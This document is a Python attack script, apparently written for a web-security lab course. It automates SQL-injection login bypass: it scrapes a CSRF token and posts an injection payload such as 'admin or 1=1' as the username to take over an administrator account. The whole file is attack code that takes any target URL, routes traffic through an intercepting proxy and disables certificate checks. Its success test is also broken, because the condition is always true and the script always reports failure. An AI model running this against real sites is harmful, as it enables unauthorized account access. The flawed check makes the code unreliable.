#!/usr/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36'}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url, verify=False, proxies=proxies, headers= headers)
	soup = BeautifulSoup(r.text, 'html.parser')
	#csrf = soup.find("input",{'name': 'csrf'})['value']
	csrf = soup.find("input")['value']		#Glancing at the html response, you'll realize csrf topken is the only 'input' element with a value defined. Clever girl, that Rana Khalil.
	return csrf
		
def exploit_sqli(s, url, payload, password):
	csrf = get_csrf_token(s, url)
	data = {"csrf": csrf,
			"username": payload,
			"password": password}
	r= s.post(url, data=data, verify=False, proxies=proxies, headers= headers)
	result = r.text
	if "Invalid username" or "Internal Server Error" in result:
		return False
	else:
		return True
		
if __name__== "__main__":
	try:
		url = sys.argv[1].strip()
		sqli_payload = sys.argv[2].strip()
		sqli_password = sys.argv[3].strip()
	except IndexError:
		print('[+] A program to explore Login Bypass via SQLi vulnerabilities.')
		print('[+] Usage: %s <url> <sql-payload> <password>' % sys.argv[0])
		print('[+] Example: %s www.example.com "admin+or+1=1" "--thisworks"' % sys.argv[0])
		sys.exit(-1)
		
	s = requests.Session()
	
	if exploit_sqli(s, url, sqli_payload, sqli_password):
		print('[+] SQL injection succesful! We have logged in as the administrator user. Now try these on the web page')
	else:
		print('[-] SQL Injection failed!')
